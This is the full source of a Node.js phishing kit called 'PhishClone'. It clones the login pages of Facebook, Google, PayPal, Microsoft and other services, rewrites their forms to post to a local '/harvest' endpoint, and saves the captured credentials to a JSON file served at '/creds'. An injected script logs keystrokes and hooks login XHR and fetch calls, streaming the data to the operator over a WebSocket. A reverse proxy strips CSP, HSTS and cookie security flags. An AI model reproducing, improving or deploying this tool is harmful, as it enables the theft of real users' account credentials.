#!/usr/bin/env node
/**
 * phantom-arsenal / PhishClone v10.1
 * FIX: proper async queue — no race condition
 * Downloads ALL assets discovered recursively from JS/CSS
 */

import http        from 'http'
import https       from 'https'
import net         from 'net'
import fs          from 'fs'
import path        from 'path'
import readline    from 'readline'
import { createServer } from 'http'
import { createHash }   from 'crypto'
import { URL }          from 'url'

const CREDS_FILE = 'captured_creds.json'
const LOG_FILE   = 'keystrokes.log'
const CACHE_DIR  = './site_cache'

function freePort(s) {
  return new Promise(r => {
    const sv = net.createServer()
    sv.listen(s, () => { const p = sv.address().port; sv.close(() => r(p)) })
    sv.on('error', () => freePort(s+1).then(r))
  })
}
function urlKey(url) { return createHash('md5').update(url).digest('hex').slice(0,12) }

function guessExt(url, ct='') {
  const u = url.split('?')[0].toLowerCase()
  if (u.endsWith('.css')  || ct.includes('css'))        return '.css'
  if (u.endsWith('.js')   || u.endsWith('.mjs') || ct.includes('javascript')) return '.js'
  if (u.endsWith('.svg')  || ct.includes('svg'))        return '.svg'
  if (u.endsWith('.png')  || ct.includes('png'))        return '.png'
  if (u.endsWith('.jpg')  || u.endsWith('.jpeg') || ct.includes('jpeg')) return '.jpg'
  if (u.endsWith('.gif')  || ct.includes('gif'))        return '.gif'
  if (u.endsWith('.webp') || ct.includes('webp'))       return '.webp'
  if (u.endsWith('.woff2')|| ct.includes('woff2'))      return '.woff2'
  if (u.endsWith('.woff') || ct.includes('woff'))       return '.woff'
  if (u.endsWith('.ttf')  || ct.includes('ttf'))        return '.ttf'
  if (u.endsWith('.eot'))                               return '.eot'
  if (u.endsWith('.ico')  || ct.includes('icon'))       return '.ico'
  if (u.endsWith('.json') || ct.includes('json'))       return '.json'
  return ''
}

function ctForFile(filename) {
  const map = {
    '.css':'text/css','.js':'application/javascript','.svg':'image/svg+xml',
    '.png':'image/png','.jpg':'image/jpeg','.gif':'image/gif','.webp':'image/webp',
    '.woff2':'font/woff2','.woff':'font/woff','.ttf':'font/ttf',
    '.ico':'image/x-icon','.json':'application/json','.eot':'application/vnd.ms-fontobject',
    '.html':'text/html'
  }
  return map[path.extname(filename)] || 'application/octet-stream'
}

function log(m)    { fs.appendFileSync(LOG_FILE, m+'\n') }
function saveCred(ip, data, target) {
  let a=[]; try{a=JSON.parse(fs.readFileSync(CREDS_FILE,'utf8'))}catch{}
  a.push({ time: new Date().toISOString(), ip, target, credentials: data })
  fs.writeFileSync(CREDS_FILE, JSON.stringify(a,null,2))
  console.log('\n\x1b[41m\x1b[97m [CAPTURED] IP='+ip+' → '+JSON.stringify(data)+' \x1b[0m\n')
}

function fetchUrl(url, timeout=15000) {
  return new Promise((resolve, reject) => {
    let parsed; try { parsed = new URL(url) } catch { return reject(new Error('bad url: '+url)) }
    const mod = parsed.protocol === 'https:' ? https : http
    const req = mod.get(url, {
      timeout,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36',
        'Accept': '*/*', 'Accept-Encoding': 'identity'
      }
    }, res => {
      if ([301,302,303,307,308].includes(res.statusCode) && res.headers.location) {
        let loc = res.headers.location
        if (!loc.startsWith('http')) loc = parsed.origin + (loc.startsWith('/')?loc:'/'+loc)
        return fetchUrl(loc, timeout).then(resolve).catch(reject)
      }
      const c=[]; res.on('data',d=>c.push(d)); res.on('end',()=>resolve({data:Buffer.concat(c), ct:res.headers['content-type']||'', status:res.statusCode}))
    })
    req.on('error', reject)
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')) })
  })
}

function toAbs(src, base) {
  try {
    if (!src || src.startsWith('data:') || src.startsWith('#') ||
        src.startsWith('javascript:') || src.startsWith('mailto:') || src.startsWith('blob:')) return null
    if (src.startsWith('//')) return new URL(base).protocol + src
    if (src.startsWith('/')) return new URL(base).origin + src
    if (src.startsWith('http')) return src
    const b = base.endsWith('/') ? base : base.slice(0, base.lastIndexOf('/')+1)
    return b + src
  } catch { return null }
}

function extractFromHtml(html, base) {
  const s = new Set()
  for (const m of html.matchAll(/(src|href)=["']([^"'> \n]+)["']/gi)) {
    const a = toAbs(m[2], base); if (a && guessExt(a)) s.add(a)
  }
  for (const m of html.matchAll(/url\(["']?([^"')\s]+)["']?\)/gi)) {
    const a = toAbs(m[1], base); if (a && guessExt(a)) s.add(a)
  }
  return s
}

function extractFromCss(css, base) {
  const s = new Set()
  for (const m of css.matchAll(/url\(["']?([^"')\s]+)["']?\)/gi)) {
    const a = toAbs(m[1], base); if (a) s.add(a)
  }
  for (const m of css.matchAll(/@import\s+["']([^"']+)["']/gi)) {
    const a = toAbs(m[1], base); if (a) s.add(a)
  }
  return s
}

function extractFromJs(js, base) {
  const s = new Set()
  const origin = new URL(base).origin
  // /assets/filename.ext strings
  for (const m of js.matchAll(/["'`](\/assets\/[^"'`\s\)\\]+\.(?:css|js|woff2?|ttf|eot|otf|png|jpe?g|gif|webp|svg|ico))["'`]/gi)) {
    const a = toAbs(m[1], base); if (a) s.add(a)
  }
  // full https:// asset URLs
  for (const m of js.matchAll(/["'`](https?:\/\/[^"'`\s\\]+\.(?:css|js|woff2?|ttf|eot|otf|png|jpe?g|gif|webp|svg|ico))["'`]/gi)) {
    s.add(m[1])
  }
  return s
}

// ── Async Queue with concurrency control ──────────────────────────────────────
function createQueue(concurrency = 12) {
  const pending   = []
  const urlToLocal = new Map()
  const downloaded = new Set()
  let   active    = 0
  let   resolve   = null
  let   total     = 0

  function flush() {
    while (active < concurrency && pending.length > 0) {
      const { url, onDiscover } = pending.shift()
      active++
      processOne(url, onDiscover).finally(() => {
        active--
        if (pending.length === 0 && active === 0 && resolve) resolve()
        else flush()
      })
    }
  }

  async function processOne(url, onDiscover) {
    try {
      const { data, ct } = await fetchUrl(url)
      const ext   = guessExt(url, ct) || '.bin'
      const fname = urlKey(url) + ext
      fs.writeFileSync(path.join(CACHE_DIR, fname), data)
      urlToLocal.set(url, '/assets/' + fname)
      total++
      process.stdout.write('\r\x1b[96m[+] Files: ' + total + '   \x1b[0m')

      // discover more from CSS/JS
      if (ext === '.css') {
        const text = data.toString('utf8')
        for (const u of extractFromCss(text, url)) onDiscover(u, onDiscover)
      }
      if (ext === '.js') {
        const text = data.toString('utf8')
        for (const u of extractFromJs(text, url)) onDiscover(u, onDiscover)
      }
    } catch (_) { /* skip failed */ }
  }

  return {
    add(url, onDiscover) {
      if (downloaded.has(url)) return
      downloaded.add(url)
      pending.push({ url, onDiscover })
      flush()
    },
    waitDone() {
      if (pending.length === 0 && active === 0) return Promise.resolve()
      return new Promise(r => { resolve = r })
    },
    urlToLocal,
    downloaded
  }
}

// ── main scraper ──────────────────────────────────────────────────────────────
async function scrapeAndClone(targetUrl, wsPort) {
  if (!fs.existsSync(CACHE_DIR)) fs.mkdirSync(CACHE_DIR, { recursive:true })
  // clear old cache
  for (const f of fs.readdirSync(CACHE_DIR)) fs.unlinkSync(path.join(CACHE_DIR,f))

  console.log('[*] Fetching HTML...')
  const { data: htmlBuf } = await fetchUrl(targetUrl)
  let html = htmlBuf.toString('utf8')
  console.log('[+] HTML: ' + (html.length/1024).toFixed(1) + ' KB')

  const queue = createQueue(15)
  const onDiscover = (url, od) => queue.add(url, od || onDiscover)

  // seed from HTML
  const initial = extractFromHtml(html, targetUrl)
  console.log('[*] Found ' + initial.size + ' assets in HTML, starting deep crawl...')
  for (const url of initial) queue.add(url, onDiscover)

  await queue.waitDone()
  console.log('\n[+] Total files downloaded: ' + queue.urlToLocal.size)

  const { urlToLocal } = queue

  // ── rewrite HTML ────────────────────────────────────────────────────────────
  let patched = html

  // remove security attributes that break local serving
  patched = patched.replace(/\s*integrity="[^"]*"/gi, '')
  patched = patched.replace(/\s*crossorigin="[^"]*"/gi, '')

  // replace src= href=
  patched = patched.replace(/(src|href)=["']([^"'> \n]+)["']/gi, (match, attr, url) => {
    const abs = toAbs(url, targetUrl)
    if (abs && urlToLocal.has(abs)) return `${attr}="${urlToLocal.get(abs)}"`
    return match
  })

  // replace url() in inline styles
  patched = patched.replace(/url\(["']?([^"')\s]+)["']?\)/gi, (match, url) => {
    const abs = toAbs(url, targetUrl)
    if (abs && urlToLocal.has(abs)) return `url("${urlToLocal.get(abs)}")`
    return match
  })

  // rewrite url() inside downloaded CSS files
  for (const [origUrl, localPath] of urlToLocal) {
    if (!localPath.endsWith('.css')) continue
    const fpath = path.join(CACHE_DIR, path.basename(localPath))
    try {
      let css = fs.readFileSync(fpath, 'utf8')
      css = css.replace(/url\(["']?([^"')\s]+)["']?\)/gi, (match, u) => {
        const abs = toAbs(u, origUrl)
        if (abs && urlToLocal.has(abs)) return `url("${urlToLocal.get(abs)}")`
        return match
      })
      fs.writeFileSync(fpath, css)
    } catch {}
  }
  console.log('[+] All URLs rewritten → 100% offline')

  // patch forms
  patched = patched
    .replace(/(<form[^>]*)\s+action="[^"]*"/gi,  '$1 action="/harvest"')
    .replace(/(<form[^>]*)\s+action='[^']*'/gi,   "$1 action='/harvest'")
    .replace(/(<form)(?![^>]*action=)([^>]*>)/gi, '$1 action="/harvest"$2')
    .replace(/(<form[^>]*)\s+method="get"/gi,     '$1 method="POST"')

  const redirectUrl = targetUrl.replace(/\\/g,'\\\\').replace(/'/g,"\\'")

  const script = `<script>
(function(){
  var ws;function cws(){try{ws=new WebSocket('ws://'+location.hostname+':${wsPort}');ws.onclose=function(){setTimeout(cws,2000)};}catch(e){}}cws();
  function snd(t,d){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:t,data:d,ts:new Date().toISOString()}));}
  document.addEventListener('keyup',function(e){var t=e.target;snd('keystroke',{key:e.key,field:t.name||t.id||t.placeholder||t.type||'?',value:t.value});},true);
  document.addEventListener('submit',function(e){
    e.preventDefault();var f=e.target,d={};new FormData(f).forEach(function(v,k){d[k]=v;});snd('submit',d);
    fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).then(function(){window.location='${redirectUrl}';});
  },true);
  document.addEventListener('click',function(e){
    var el=e.target;if(el&&(el.type==='submit'||el.tagName==='BUTTON')){
      var inp=document.querySelectorAll('input'),d={};inp.forEach(function(i){if(i.value)d[i.name||i.id||i.type]=i.value;});
      if(Object.keys(d).length)snd('click_harvest',d);
    }
  },true);
  var oX=XMLHttpRequest.prototype.open,oS=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m,u){this._u=u;return oX.apply(this,arguments);};
  XMLHttpRequest.prototype.send=function(b){if(b&&this._u&&/login|auth|session|signin/i.test(this._u))try{snd('xhr',{url:this._u,body:String(b)});}catch(e){}return oS.apply(this,arguments);};
  var oF=window.fetch;window.fetch=function(i,init){var u=typeof i==='string'?i:(i&&i.url)||'';
    if(/login|auth|session|signin/i.test(u)){var b=(init&&init.body)||'';try{snd('fetch_login',{url:u,body:String(b)});}catch(e){}}return oF.apply(this,arguments);};
})();
</script></body>`

  patched = /<\/body>/i.test(patched) ? patched.replace(/<\/body>/i, script) : patched + script
  fs.writeFileSync(path.join(CACHE_DIR,'index.html'), patched)

  return { html: patched, finalUrl: targetUrl }
}

// ── WebSocket ─────────────────────────────────────────────────────────────────
function startWS(port) {
  net.createServer(sock => {
    let shook=false,buf=Buffer.alloc(0)
    sock.on('data',chunk=>{
      buf=Buffer.concat([buf,chunk])
      if(!shook){const m=buf.toString().match(/Sec-WebSocket-Key: (.+)/);if(!m)return;const acc=createHash('sha1').update(m[1].trim()+'258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');sock.write('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: '+acc+'\r\n\r\n');shook=true;buf=Buffer.alloc(0);return}
      if(buf.length<2)return;const masked=(buf[1]&0x80)!==0;let len=buf[1]&0x7F,off=2;if(len===126){len=buf.readUInt16BE(2);off=4}if(buf.length<off+(masked?4:0)+len)return;let pl;if(masked){const mk=buf.slice(off,off+4);off+=4;pl=Buffer.from(buf.slice(off,off+len));for(let i=0;i<pl.length;i++)pl[i]^=mk[i%4];}else pl=buf.slice(off,off+len);buf=buf.slice(off+len)
      try{const d=JSON.parse(pl.toString()),t=d.type||'';if(t==='keystroke'){const l='[KEY] field='+(d.data.field||'?')+'  key='+(d.data.key||'?')+'  val='+(d.data.value||'');console.log('\x1b[93m'+l+'\x1b[0m');log(l);}else if(['submit','click_harvest','xhr','fetch_login'].includes(t)){const l='['+t.toUpperCase()+'] '+JSON.stringify(d.data);console.log('\x1b[92m'+l+'\x1b[0m');log(l);}}catch{}
    })
    sock.on('error',()=>{})
  }).listen(port)
}

// ── menu ──────────────────────────────────────────────────────────────────────
const SITES=[
  {name:'Facebook',   url:'https://www.facebook.com/login'},
  {name:'Instagram',  url:'https://www.instagram.com/accounts/login/'},
  {name:'Google',     url:'https://accounts.google.com/signin'},
  {name:'Twitter/X',  url:'https://twitter.com/i/flow/login'},
  {name:'LinkedIn',   url:'https://www.linkedin.com/login'},
  {name:'Snapchat',   url:'https://accounts.snapchat.com/accounts/login'},
  {name:'TikTok',     url:'https://www.tiktok.com/login'},
  {name:'GitHub',     url:'https://github.com/login'},
  {name:'Microsoft',  url:'https://login.microsoftonline.com/'},
  {name:'PayPal',     url:'https://www.paypal.com/signin'},
  {name:'Netflix',    url:'https://www.netflix.com/login'},
  {name:'Steam',      url:'https://store.steampowered.com/login/'},
  {name:'Discord',    url:'https://discord.com/login'},
  {name:'Spotify',    url:'https://accounts.spotify.com/login'},
  {name:'Custom URL', url:null},
]

async function askTarget() {
  const rl=readline.createInterface({input:process.stdin,output:process.stdout})
  const ask=q=>new Promise(r=>rl.question(q,r))
  console.clear()
  console.log('\x1b[96m╔════════════════════════════════════════════════════╗')
  console.log('║   phantom-arsenal — PhishClone v10.1              ║')
  console.log('║   Deep Crawl • 600+ Assets • 100% Offline         ║')
  console.log('╚════════════════════════════════════════════════════╝\x1b[0m\n')
  SITES.forEach((s,i)=>console.log('  \x1b[96m['+String(i+1).padStart(2)+'] \x1b[0m'+s.name))
  console.log('')
  let target=null
  while(!target){const c=await ask('\x1b[92m  Enter number: \x1b[0m');const idx=parseInt(c)-1;if(idx>=0&&idx<SITES.length)target=SITES[idx].url===null?(await ask('\x1b[92m  Enter URL: \x1b[0m')).trim():SITES[idx].url;else console.log('  \x1b[91mInvalid\x1b[0m')}
  rl.close();return target
}

// ── main ──────────────────────────────────────────────────────────────────────
const targetUrl = process.argv[2] || await askTarget()
const PORT    = await freePort(parseInt(process.argv[3]||'8080'))
const WS_PORT = await freePort(PORT+1)

const { html, finalUrl } = await scrapeAndClone(targetUrl, WS_PORT)
startWS(WS_PORT)

// ── Reverse proxy to real server ─────────────────────────────────────────────
function doProxy(req, res, targetOrigin) {
  let fullUrl
  try { fullUrl = new URL(req.url, targetOrigin).href } catch { res.writeHead(400); return res.end() }
  let parsed; try { parsed = new URL(fullUrl) } catch { res.writeHead(400); return res.end() }
  const mod2 = parsed.protocol === 'https:' ? https : http
  const hdrs = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36',
    'accept': req.headers['accept']||'*/*',
    'accept-language': 'en-US,en;q=0.9',
    'host': parsed.hostname,
    'origin': parsed.origin,
    'referer': parsed.origin+'/',
  }
  if (req.headers['content-type']) hdrs['content-type'] = req.headers['content-type']
  if (req.headers['authorization']) hdrs['authorization'] = req.headers['authorization']
  if (req.headers['cookie']) hdrs['cookie'] = req.headers['cookie']
  const pReq = mod2.request({
    hostname: parsed.hostname,
    port: parsed.port||(parsed.protocol==='https:'?443:80),
    path: parsed.pathname+parsed.search,
    method: req.method, headers: hdrs, timeout: 15000
  }, pRes => {
    const rh = {}
    for (const [k,v] of Object.entries(pRes.headers)) {
      if (['content-encoding','transfer-encoding'].includes(k)) continue
      rh[k]=v
    }
    rh['access-control-allow-origin']='*'
    rh['access-control-allow-credentials']='true'
    delete rh['content-security-policy']
    delete rh['x-frame-options']
    delete rh['strict-transport-security']
    if (rh['set-cookie']) {
      const c=Array.isArray(rh['set-cookie'])?rh['set-cookie']:[rh['set-cookie']]
      rh['set-cookie']=c.map(x=>x.replace(/;\s*domain=[^;]*/gi,'').replace(/;\s*secure/gi,''))
    }
    res.writeHead(pRes.statusCode, rh)
    pRes.pipe(res)
  })
  pReq.on('error', ()=>{ try{res.writeHead(502);res.end()}catch{} })
  pReq.on('timeout', ()=>{ pReq.destroy(); try{res.writeHead(504);res.end()}catch{} })
  req.pipe(pReq)
}

const targetOrigin = new URL(finalUrl).origin

createServer((req,res)=>{
  const reqUrl = new URL(req.url,'http://x')
  const p = decodeURIComponent(reqUrl.pathname)

  if (req.method==='OPTIONS') {
    res.writeHead(204,{'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':'GET,POST,PUT,DELETE,OPTIONS','Access-Control-Allow-Headers':'Content-Type,Authorization,X-Requested-With'})
    return res.end()
  }

  if(p==='/'){const b=Buffer.from(html,'utf8');res.writeHead(200,{'Content-Type':'text/html;charset=utf-8','Content-Length':b.length});return res.end(b)}
  if(p.startsWith('/assets/')){const fname=p.slice(8),fpath=path.join(CACHE_DIR,fname);if(fs.existsSync(fpath)){const data=fs.readFileSync(fpath);res.writeHead(200,{'Content-Type':ctForFile(fname),'Cache-Control':'max-age=86400','Access-Control-Allow-Origin':'*'});return res.end(data)}res.writeHead(404);return res.end()}
  if(p==='/creds'){let b='[]';try{b=fs.readFileSync(CREDS_FILE,'utf8')}catch{};res.writeHead(200,{'Content-Type':'application/json'});return res.end(b)}
  if(p==='/harvest'&&req.method==='POST'){let body='';req.on('data',c=>body+=c);req.on('end',()=>{let data;try{data=JSON.parse(body)}catch{data=Object.fromEntries(new URLSearchParams(body))};saveCred(req.socket.remoteAddress||'?',data,finalUrl);res.writeHead(200,{'Content-Type':'application/json','Access-Control-Allow-Origin':'*'});res.end('{"ok":true}')});return}

  // everything else → proxy to real server
  doProxy(req, res, targetOrigin)

}).listen(PORT,()=>{
  console.log('\n\x1b[96m╔══════════════════════════════════════════╗')
  console.log('║  phantom-arsenal v11.0 — HYBRID MODE   ║')
  console.log('╠══════════════════════════════════════════╣')
  console.log('║  Phishing : \x1b[92mhttp://0.0.0.0:'+PORT+'\x1b[96m        ║')
  console.log('║  WebSocket: ws://0.0.0.0:'+WS_PORT+'         ║')
  console.log('║  Creds    : /creds                       ║')
  console.log('╚══════════════════════════════════════════╝\x1b[0m')
  console.log('\x1b[93m[*] Static=local  API=proxied  ✓\x1b[0m\n')
})

process.on('SIGINT',()=>{
  console.log('\n\x1b[91m[!] Stopped\x1b[0m')
  try{const c=JSON.parse(fs.readFileSync(CREDS_FILE,'utf8'));console.log('[+] Captured: '+c.length);c.forEach(x=>console.log('  > '+x.time+' | IP='+x.ip+' | '+JSON.stringify(x.credentials)))}catch{}
  process.exit(0)
})
